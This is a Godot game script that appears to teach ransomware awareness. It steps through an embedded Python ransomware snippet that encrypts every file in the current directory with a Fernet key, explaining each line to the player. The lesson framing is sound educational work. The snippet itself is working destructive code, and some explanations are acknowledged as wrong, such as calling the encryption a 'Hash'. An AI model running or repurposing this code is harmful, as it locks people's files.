extends MarginContainer


@onready var code_edit: CodeEdit = $HSplitContainer/CodeEdit
@onready var overlay: ColorRect = $HSplitContainer/CodeEdit/Overlay
@onready var rich_text_label: RichTextLabel = $HSplitContainer/HFlowContainer/RichTextLabel


@export var back_button: Button
@export var animation : AnimationPlayer
@export var window : Control

var step: int = 0
var ransomware_code = {
	"step_1" : "import os\nfrom cryptography.fernet import fernet",
	"step_2": "allfiles = []\nfor file in os.listdir():\n\tif file == 'malware.py' or file == 'key.key' or file == 'decr.py':\n\t\tcontinue\n\tif os.path.isfile(file):\n\t\tallfiles.append(file)\nprint(allfiles)\n\n",
	"step_3": "key = Fernet.generate_key()\nwith open('key.key', 'wb') as thekey:\n\tthekey.write(key)\n\n",
	"step_4": "for file in allfiles:\n\twith open(file, 'rb') as thefile:\n\t\tcontent = thefile.read()\n\tcontent_encryp = Fernet(key).encrypt(content)\n\twith open(file, 'wb') as thefile:\n\t\tthefile.write(content_encryp)\n\n",
	"step_5": "print('All your files have been encrypted')\n",
	
}
signal ransomware_encrypt_finished

func _ready() -> void:
	back_button.disabled = true
	#code_edit.text = ""
	overlay.visible = false 
	rich_text_label.text = "⚠️ DANGER: RANSOMWARE ALERT ⚠️\n\nRansomware is one of the most dangerous types of malicious software. Once it infects your computer, it locks or encrypts your files so you cannot open them. To protect yourself from ransomware, always back up your files, keep your system updated, use strong security tools, and be careful with emails and links, because prevention is much easier than fixing the damage."

func _process(_delta: float) -> void:
	if Input.is_action_just_pressed("next_pressed"):
		back_button.disabled = false
		step += 1
		set_step(step)

	elif Input.is_action_just_pressed("back_pressed"):
		if step > 0:
			step -= 1
			set_step(step)
			back_button.disabled = step == 0
			

func _on_back_button_down() -> void:
	pass

func _on_next_button_down() -> void:
	pass

func set_step(step: int) -> void:
	match step:
		1:
			overlay.visible = true
			#code_edit.text = ransomware_code.step_1
			rich_text_label.text = "step 1: Importing the Tools\n\nFirst, the program imports two important tools:\n\n1. \"os\" This lets the program interact with the computer’s files and folders. Think of it as a helper that can look inside directories, check whether something is a file, and manage paths."
			animation.play("encrypt_1")
			#TODO : Wrong information, explain what is crpytography.fernet
		2:	
			#code_edit.text = ransomware_code.step_1
			rich_text_label.text = "step 1: Importing the Tools\n\nFirst, the program imports two important tools:\n\n2. \"Fernet from cryptography\" This is a secure encryption system. You can imagine it like a lock-and-key system: it can lock data (encrypt it) so nobody can read it, and later unlock it (decrypt it) using password key."
			animation.play("encrypt_2")
			#TODO : Wrong explanation. Explain what is fernet import
		3:
			#code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2
			rich_text_label.text = "step 2: Collecting Files to Encrypt\n\nThe program prepares a list of files to be encrypted:\n\n- It starts with an empty list called \"allfiles.\"\n\n"
			animation.play("encrypt_3")
		4:	
			rich_text_label.text = "step 2: Collecting Files to Encrypt\n\nThe program prepares a list of files to be encrypted:\n\n- It starts with an empty list called \"allfiles.\"\n\n- Then, it looks through everything in the current directory using \"os.listdir().\""
			animation.play("encrypt_4")
		5:	
			rich_text_label.text = "step 2: Collecting Files to Encrypt\n\nCertain files are skipped:\n\n- The program file itself (malware.py)\n\n- The encryption key file (key.key)\n\n- And a possible decryption script (decr.py)\n\nThese are skipped so the program doesn’t lock itself or make the key unreachable."
			animation.play("encrypt_5")
		6:	
			rich_text_label.text = "step 2: Collecting Files to Encrypt\n\nIf an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\"."
			animation.play("encrypt_6")
		7:	
			#code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2
			rich_text_label.text = "step 2: Collecting Files to Encrypt\n\nFinally, the list is printed out so we can see which files are going to be encrypted"
			animation.play("encrypt_7")
				
		8:
			#code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2 + ransomware_code.step_3
			rich_text_label.text = "step 3: Creating the Password Key - the most important part\n\n- The program calls Fernet.generate_key(), Technically it creates a new password key with a randomized set of characters, but this time it is set to \"WhiteHat\".\n\n- This key is what will lock and later unlock the files. Without it, the encrypted files are useless, because nobody can read them."
			animation.play("encrypt_8")
		9:	
			#code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2 + ransomware_code.step_3
			rich_text_label.text = "step 3: Creating the Password Key\n\n- The program then saves this key into a file called key.key, using binary write mode (wb).\n\nSo at this stage, the program has created the “master key” and stored it safely in a separate file."
			animation.play("encrypt_9")
					
		10:
			#code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2  + ransomware_code.step_3 + ransomware_code.step_4
			rich_text_label.text = "step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list."
			animation.play("encrypt_10")
		11:	
			rich_text_label.text = "step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list.\n\n- Each file is opened in binary read mode (rb) so the raw data can be read."
			animation.play("encrypt_11")
		12:
			rich_text_label.text = "step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list.\n\n- Each file is opened in binary read mode (rb) so the raw data can be read.\n\n- That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."
			animation.play("encrypt_12")
		13:	
			rich_text_label.text = "step 4: Encrypting the Files\n\n- Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).\n\nAt this point, the files are no longer usable in their normal form — they have been locked with the password key."
			animation.play("encrypt_13")
		14:
			#code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2  + ransomware_code.step_3 + ransomware_code.step_4 + ransomware_code.step_5
			rich_text_label.text = "step 5: Final Confirmation\n\nThe program prints a message to confirm that all the files have been encrypted.”"
			animation.play("encrypt_14")
		15: 
			rich_text_label.text = "Now we will run the code and generate a key."
		16:
			window.visible=true
			animation.play("RansomwareRun")
			
 


func _on_window_window_exited() -> void:
	ransomware_encrypt_finished.emit()
